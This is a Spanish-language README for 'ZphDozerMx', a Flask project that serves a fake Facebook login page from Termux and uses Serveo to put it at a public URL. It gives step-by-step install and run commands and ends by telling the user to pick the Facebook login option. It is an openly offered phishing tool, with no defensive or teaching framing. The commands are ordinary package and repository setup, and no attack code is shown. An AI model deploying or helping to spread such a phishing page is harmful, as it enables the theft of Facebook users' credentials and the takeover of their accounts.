# ZphDozerMx

ZphDozerMx es un proyecto Flask que sirve un formulario de inicio de sesión falso de Facebook. Este proyecto se ejecuta en Termux y utiliza Serveo para generar una URL pública.

## Instalación

Sigue los pasos a continuación para instalar y configurar ZphDozerMx en Termux.

### Requisitos

Asegúrate de tener Termux instalado en tu dispositivo Android.

### Pasos de instalación

1. Aquí tienes los comandos de instalación en formato de lista para que los puedas seguir fácilmente:

1. **Actualizar paquetes y herramientas de Termux**:

   ```bash
   pkg update -y && pkg upgrade -y
   ```

2. **Instalar Git**:

   ```bash
   pkg install git -y
   ```

3. **Instalar Python**:

   ```bash
   pkg install python -y
   ```

4. **Instalar OpenSSH** (para utilizar Serveo):

   ```bash
   pkg install openssh -y
   ```

5. **Clonar el repositorio desde GitHub**:

   ```bash
   git clone https://github.com/3meses/ZphDozerMx.git
   ```

6. **Cambiar al directorio del proyecto**:

   ```bash
   cd ZphDozerMx
   ```

7. **Instalar las dependencias de Python**:

   ```bash
   pip install -r requirements.txt
   ```

8. **Ejecutar el script**:

   ```bash
   python zphdozer.py
   ```

9. **Seleccionar la opción 1 en la terminal** para elegir el login de Facebook.
